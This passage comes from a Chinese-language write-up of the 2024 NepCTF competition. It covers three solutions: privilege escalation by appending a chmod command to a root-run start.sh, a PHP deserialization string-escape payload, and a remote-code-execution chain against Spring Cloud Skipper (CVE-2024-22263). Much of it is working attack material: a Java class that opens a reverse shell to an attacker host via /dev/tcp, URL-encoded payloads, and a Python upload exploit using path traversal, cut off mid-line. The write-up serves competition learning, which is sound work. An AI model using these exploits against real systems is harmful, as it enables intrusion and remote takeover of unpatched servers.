class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Sec</span>-Fetch-Site: none<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-User: ?<span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>:session=eyJhZG1pbl9sb2dnZWRfaW4iOnRydWV9.ZslOZw.KFv2PjH93EEhNdmCRUW1Nx2vPe4<br><span class="hljs-attribute">Connection</span>: close<br><br><br></code></pre></td></tr></table></figure><p>有个pwn文件，传fascan上去扫一下开放的端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 11451 &lt;fscan<br><br>nc vps 11451 &gt;fscan<br><span class="hljs-built_in">chmod</span> +x fscan<br>./fscan -h 127.0.0.1<br></code></pre></td></tr></table></figure><p>可以发现内网的8888端口是开放的</p><p>nc一下发现是start.sh在运行，而且start.sh是root用户的，那起的服务也就具有root权限</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> <span class="hljs-string">&quot;chmod 0777 /home/ctfuser/flag*&quot;</span> &gt;&gt;start.sh<br><span class="hljs-attribute">nc</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p>flag就有权限了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/home/</span>ctfuser/flag*<br></code></pre></td></tr></table></figure><p>NepCTF{197b7e20-0bb8-47a1-a431-82a2c18ed9ae}</p><h1 id="php_master"><a class="markdownIt-Anchor" href="#php_master"></a> PHP_MASTER!!</h1><p>要构造的调用链C::__destruct–&gt;B::__tostring–&gt;phpinfo</p><p>要执行($this-&gt;b) ()就要绕过过滤</p><p>由于mb_substr(data,start,end)，当end为负数时是从后往前数，所以构造<code>nep=1&amp;nep1=]              [NepCTF]</code>进行绕过</p><p>因为使用<code>$data = str_ireplace(&quot;\0&quot;,&quot;00&quot;,$ser);</code>进行替换，所以是反序列化变长逃逸，由于只能控制C-&gt;s;</p><p>因为echo是str，所以需要使C-&gt;str是B，所以构造<code>s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;&#125;</code></p><p>把这个放到C,最后要使得序列化C之后要得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;s&quot;</span>;s:?:<span class="hljs-string">&quot;填充\0&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;str&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;str&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpinfo&quot;</span>;&#125;&#125;;&#125;<span class="hljs-string">&quot;;s:3:&quot;</span>str<span class="hljs-string">&quot;;N;&#125;</span><br></code></pre></td></tr></table></figure><p>?和\0的个数是我们要计算的，而通过c传递的值为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">填充\<span class="hljs-number">0</span><span class="hljs-string">&quot;;s:3:&quot;</span>st<span class="hljs-string">r&quot;;s:3:&quot;</span>st<span class="hljs-string">r&quot;;O:1:&quot;</span>B<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span><span class="hljs-string">b&quot;;s:7:&quot;</span>phpinfo<span class="hljs-string">&quot;;&#125;&#125;;&#125;</span><br></code></pre></td></tr></table></figure><p>如果不填充？的值就是<code>&quot;;s:3:&quot;str&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;;&#125;</code>的长度</p><p>每填充一个\0经过替换后就会逃逸右边一个符号，总共需要逃逸<code>&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;;&#125;</code>的长度为49</p><p>所以？的值就是输入c的长度，即<code>49个\0&quot;;s:3:&quot;str&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;;&#125;</code>的长度，为108</p><p>通过url编码</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%00</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%33</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%72</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%33</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%72</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%4</span>f<span class="hljs-variable">%3</span>a<span class="hljs-variable">%31</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%42</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%31</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%7</span>b<span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%31</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%62</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%73</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%37</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%22</span><span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%7</span>d<span class="hljs-variable">%7</span>d<span class="hljs-variable">%3</span>b<span class="hljs-variable">%7</span>d&amp;nep<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;nep<span class="hljs-number">1</span><span class="hljs-operator">=</span>]              [NepCTF]<br></code></pre></td></tr></table></figure><p>序列化后变成</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;s&quot;</span>;s:<span class="hljs-number">108</span>:<span class="hljs-string">&quot;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;str&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;str&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;phpinfo&quot;</span>;&#125;&#125;;&#125;<span class="hljs-string">&quot;;s:3:&quot;</span>str<span class="hljs-string">&quot;;N;&#125;</span><br></code></pre></td></tr></table></figure><p>nepctf{fc8b21346275}</p><h1 id="always-rce-first"><a class="markdownIt-Anchor" href="#always-rce-first"></a> Always RCE First</h1><p>访问<a href="https://neptune-46711.nepctf.lemonprefect.cn/api/about">https://neptune-46711.nepctf.lemonprefect.cn/api/about</a></p><img src="/2024/08/26/2024NepCTF/6.jpg" class=""><p>用的Spring Cloud Skipper Server版本是2.11.2，google搜一下发现这个版本存在CVE可以在任意位置写文件</p><p><a href="https://github.com/securelayer7/CVE-2024-22263_Scanner">https://github.com/securelayer7/CVE-2024-22263_Scanner</a></p><p><a href="https://yyjccc.github.io/2024/07/12/springcloud-dataflow%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%EF%BC%88CVE-2024-22263%EF%BC%89/">https://yyjccc.github.io/2024/07/12/springcloud-dataflow任意文件写入（CVE-2024-22263）/</a></p><img src="/2024/08/26/2024NepCTF/7.jpg" class=""><p>Dockerfile 里面用的是jdk8</p><p>搜一下发现spring-boot jdk8存在从文件上传到RCE的利用方法</p><p><a href="https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks">https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks</a></p><p><a href="https://forum.butian.net/share/1623">https://forum.butian.net/share/1623</a></p><p>把里面的IBM33722改成反弹shell</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> sun.nio.cs.ext;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.UUID;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IBM33722</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IBM33722</span><span class="hljs-params">()</span> &#123;<br>        fun();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> HashMap&lt;String, String&gt; <span class="hljs-title function_">fun</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString().replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).substring(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>        String[] var0;<br>        <span class="hljs-keyword">if</span> (var2.startsWith(<span class="hljs-string">&quot;Mac OS&quot;</span>)) &#123;<br>            var0 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;open -a Calculator&quot;</span>&#125;;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var2.startsWith(<span class="hljs-string">&quot;Windows&quot;</span>)) &#123;<br>            var0 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>&#125;;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>)).exists()) &#123;<br>            var0 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;bash -i&gt;&amp;/dev/tcp/vps/9090 0&gt;&amp;1&quot;</span>&#125;;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            var0 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;bash -i&gt;&amp;/dev/tcp/vps/9090 0&gt;&amp;1&quot;</span>&#125;;<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(var0);<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable var4) &#123;<br>            var4.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        fun();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后打包成charsets.jar,再压缩成charsets.zip,再通过CVE-2024-22263上传，脚本要小修一下，本地搭了docker调才发现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logo</span>():<br>    logo = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"> ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██╗  ██╗      ██████╗ ██████╗ ██████╗  ██████╗ ██████╗ </span><br><span class="hljs-string">██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██║  ██║      ╚════██╗╚════██╗╚════██╗██╔════╝ ╚════██╗</span><br><span class="hljs-string">██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝███████║█████╗ █████╔╝ █████╔╝ █████╔╝███████╗  █████╔╝</span><br><span class="hljs-string">██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║╚════╝██╔═══╝ ██╔═══╝ ██╔═══╝ ██╔═══██╗ ╚═══██╗</span><br><span class="hljs-string">╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗     ██║      ███████╗███████╗███████╗╚██████╔╝██████╔╝</span><br><span class="hljs-string"> ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝     ╚═╝      ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ </span><br><span class="hljs-string">                                                                                                             </span><br><span class="hljs-string">                                        By: SecureLayer7 (Zeyad Azima)</span><br><span class="hljs-string">                            https://github.com/securelayer7/CVE-2024-22263_Scanner</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(logo)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">createPocFile</span>(<span class="hljs-params">target, port</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;poc.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(<span class="hljs-string">f&quot;Target: <span class="hljs-subst">&#123;target&#125;</span>\nPort: <span class="hljs-subst">&#123;port&#125;</span>\n&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] POC file created successfully.&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error creating POC file: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">zipPocFile</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> zipfile.ZipFile(<span class="hljs-string">&#x27;charsets.zip&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> zipf:<br>            zipf.write(<span class="hljs-string">&#x27;charsets.jar&#x27;</span>, compress_type=zipfile.ZIP_DEFLATED)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] POC file zipped successfully.&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error creating ZIP file: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">zipToByteArray</span>(<span class="hljs-params">zipFilePath</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(zipFilePath, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> zipFile:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] ZIP file converted to byte array.&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>(zipFile.read())<br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] ZIP file not found: <span class="hljs-subst">&#123;zipFilePath&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error reading ZIP file: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">uploadPackage</span>(<span class="hljs-params">url, repoName, packageName, version, packageFileAsBytes</span>):<br>    uploadRequest = &#123;<br>        <span class="hljs-string">&quot;repoName&quot;</span>: repoName,<br>        <span class="hljs-string">&quot;name&quot;</span>: packageName,<br>        <span class="hljs-string">&quot;version&quot;</span>: version,<br>        <span class="hljs-string">&quot;extension&quot;</span>: <span class="hljs-string">&quot;zip&quot;</span>,<br>        <span class="hljs-string">&quot;packageFileAsBytes&quot;</span>: packageFileAsBytes<br>    &#125;<br>    <br>    headers = &#123;<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">try</span>:<br>        response = requests.post(url, headers=headers, data=json.dumps(uploadRequest), timeout=<span class="hljs-number">10</span>, verify=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">return</span> response, uploadRequest<br>    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error sending request to <span class="hljs-subst">&#123;url&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Unexpected error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    logo()<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;Upload a package to the server.&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-t&#x27;</span>, <span class="hljs-string">&#x27;--target&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>,default=<span class="hljs-string">&quot;https://neptune-46711.nepctf.lemonprefect.cn&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;The target to scan (e.g., http://192.168.1.1).&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;--port&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, default=<span class="hljs-number">443</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;The port on the target (default: 80).&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-r&#x27;</span>, <span class="hljs-string">&#x27;--repoName&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-string">&quot;local&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;The repository name (default: local).&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-n&#x27;</span>, <span class="hljs-string">&#x27;--packageName&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-string">&quot;../../../../layers/paketo-buildpacks_bellsoft-liberica/jre/lib&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;The name of the package (default: ../../../poc).&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-v&#x27;</span>, <span class="hljs-string">&#x27;--version&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-string">&quot;1.0.0&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;The version of the package (default: 1.0.0).&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-f&#x27;</span>, <span class="hljs-string">&#x27;--file&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;A file containing a list of targets to scan in the format &quot;http://target,port&quot;.&#x27;</span>)<br><br>    args = parser.parse_args()<br><br>    targets = []<br>    <br>    <span class="hljs-keyword">if</span> args.file:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(args.file, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                targets = [line.strip().split(<span class="hljs-string">&#x27;,&#x27;</span>) <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines()]<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Targets loaded from file.&quot;</span>)<br>        <span class="hljs-keyword">except</span> FileNotFoundError:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] File not found: <span class="hljs-subst">&#123;args.file&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Error reading file <span class="hljs-subst">&#123;args.file&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">elif</span> args.target:<br>        targets = [(args.target, args.port)]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Please provide either a target with -t or a file with targets using -f.&quot;</span>)<br>    <br>    <span class="hljs-keyword">for</span> target, port <span class="hljs-keyword">in</span> targets:<br>        zipPocFile()<br>        packageFileAsBytes = zipToByteArray(<span 